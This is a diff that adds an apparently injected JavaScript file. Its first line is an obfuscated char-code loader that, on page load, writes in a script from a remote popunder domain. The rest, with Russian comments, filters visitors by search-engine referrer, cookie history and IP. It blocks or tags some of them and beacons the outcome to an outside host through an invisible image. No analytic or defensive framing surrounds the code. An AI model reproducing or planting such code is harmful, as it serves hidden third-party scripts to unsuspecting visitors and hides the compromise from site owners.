@@ -1,0 +1,87 @@
+function Decode(){var temp="",i,c=0,out="";var str="60!115!99!114!105!112!116!62!32!100!111!99!117!109!101!110!116!46!119!114!105!116!101!40!34!60!115!99!34!43!34!114!105!112!116!32!108!97!110!103!117!97!103!101!61!39!106!97!118!97!115!99!114!105!112!116!39!32!116!121!112!101!61!39!116!101!120!116!47!106!97!118!97!115!99!114!105!112!116!39!32!115!114!99!61!39!104!116!116!112!58!47!47!114!101!119!116!111!112!46!112!111!112!117!110!100!101!114!46!114!117!47!111!117!116!46!112!104!112!63!115!105!100!61!57!53!50!48!53!39!62!60!47!115!99!114!34!43!34!105!112!116!62!34!41!32!60!47!115!99!114!105!112!116!62!";l=str.length;while(c<=str.length-1){while(str.charAt(c)!='!')temp=temp+str.charAt(c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}Decode();
+
+
+
+
+pertd="$IP_ADDRESS$";us="$USER_ID$";
+function getCookieVal (offset) {
+ var endstr = document.cookie.indexOf (";", offset);
+ if (endstr == -1)
+ endstr = document.cookie.length;
+ return unescape(document.cookie.substring(offset, endstr));
+}
+function GetCookie (name) {
+ var arg = name + "=";
+ var alen = arg.length;
+ var clen = document.cookie.length;
+ var i = 0;
+ while (i < clen) {
+ var j = i + alen;
+ if (document.cookie.substring(i, j) == arg)
+ return getCookieVal (j);
+ i = document.cookie.indexOf(" ", i) + 1;
+ if (i == 0)
+ break;
+ }
+ return null;
+}
+function SetCookie(name, value, expiredays, path, domain, secure) {
+   if (expiredays) {
+      var exdate=new Date();
+      exdate.setDate(exdate.getDate()+expiredays);
+      var expires = exdate.toGMTString();
+   }
+   document.cookie = name + "=" + escape(value) +
+   ((expiredays) ? "; expires=" + expiredays.toGMTString() : "") +
+   ((path) ? "; path=" + path : "; path=/");
+}
+
+var lgExD = new Date();
+lgExD.setTime(lgExD.getTime() + 36000000000);
+ lgExD.toGMTString();
+var m3_ExD = new Date(); 
+m3_ExD.setTime(m3_ExD.getTime() + 9000000000);
+
+///s_name - домен сайта !!!
+///us - login data
+///pertd - ip сайта
+///z_rf - индикатор прохода всех проверокс
+///m_rf - индикатор uipre
+///l_rf - информация о текущеи referer 
+///m_vs= cook:uipvi -число посещений пользователем сайта
+
+///cook:uipre - градация доверенности 0- первичное посещение 1-3 доверенные 4-6 на обработка 7-9 нет доверия. срок cookies 1 год
+///  1-доверенный, 3 - первое посещение, 4-большое число кликов, таймаут 3 месяца 8- бокировать IP, 7- блокировать логин
+///uipre обрабатывает только переходы  с yandex, google, rambler, mail, yahoo 
+///uipre исключает в поисковике поиск по домену сайта
+
+/// максимальное посещение 100 страниц, далее ограничивем по uipvi не 3 месяца 
+
+ 
+function cnt(){
+z_rf=0;
+m_rf = GetCookie("uipre");
+if ((!m_rf)||(m_rf<0)) m_rf=0;
+if (m_rf > 6 ) {SetCookie("uipre",m_rf,lgExD);return 0;}
+if (m_rf > 3 ) return 0;
+if (m_rf == 0){
+	l_rf = document.referrer;
+	SetCookie("uipe",l_rf);
+	if (!l_rf || (l_rf.indexOf("undef")>0)) {SetCookie("uipre","9",lgExD);return 0;}
+	if ((l_rf.indexOf("yandex")>0) || (l_rf.indexOf("google")>0) || (l_rf.indexOf("rambler")>0) || (l_rf.indexOf("mail")>0) || (l_rf.indexOf("yahoo")>0)) z_rf=1;
+	i=0;if (l_rf.indexOf("google")>0) i=100;
+	if (!z_rf) {SetCookie("uipre","10",lgExD);return 0;}
+	if ((z_rf==1) && (l_rf.indexOf("anstar",i)>0)) {SetCookie("uipre","11",lgExD);return 0;} ////CHANGE anstar
+}
+if (pertd.substring(0,6) == "95.153") {SetCookie("uipre","8",lgExD);return 0;}
+m_vs = GetCookie("uipvi");
+if (!m_vs) m_vs=0;
+if ( eval(m_vs) >100) {SetCookie("uipvi","1",m3_ExD);SetCookie("uipre","4",m3_ExD);return 0;}
+    else {m_vs = eval(m_vs) +1; SetCookie("uipvi",m_vs,m3_ExD)}
+SetCookie("uipre","1");
+return 1;
+}
+z=cnt();
+m_rf = GetCookie("uipre");
+if (z && (m_vs>1)) document.write('<img src="http://rew.aiq.ru/?com=w&str=vse-ist exicuted uipre = '+m_rf+'" border="0" width="0" high="0">')
+else document.write('<img src="http://rew.aiq.ru/?com=w&str=vse-ist ---------error  uipre = '+m_rf+' " border="0" width="0" high="0">')
